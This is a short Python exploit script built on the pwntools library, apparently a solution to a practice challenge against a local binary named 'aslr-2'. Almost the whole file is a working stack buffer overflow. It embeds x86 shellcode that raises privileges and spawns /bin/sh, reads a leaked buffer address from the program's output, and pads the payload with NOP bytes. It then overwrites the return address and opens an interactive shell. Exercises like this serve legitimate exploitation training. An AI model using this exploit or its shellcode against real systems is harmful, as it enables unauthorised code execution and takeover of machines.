#! /usr/bin/env python



from pwn import *
import os

shellcode = "j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xdb1\xc9j\x0bXShn/shh//bi\x89\xe3\xcd\x80"


fname = "./aslr-2"

p = process (fname)
#print(p.recv())
output = p.recv()
word = (output.split())
buf_addr = word[15]
print (buf_addr)

buf_addr = int(buf_addr, 16) - 136
print(buf_addr)

#gdb.attach(p)

buf = shellcode

while len(buf) < 0x8c:
    buf =  buf + "\x90"

buf += p32(buf_addr)

f = open("c.txt", "w")
f.write(buf)
f.close()

p.sendline(buf)
#p.wait()

#c = Core('core')
#buf_addr = c.stack.find(buf)

#print(hex(buf_addr))

#print(d)

p.interactive()


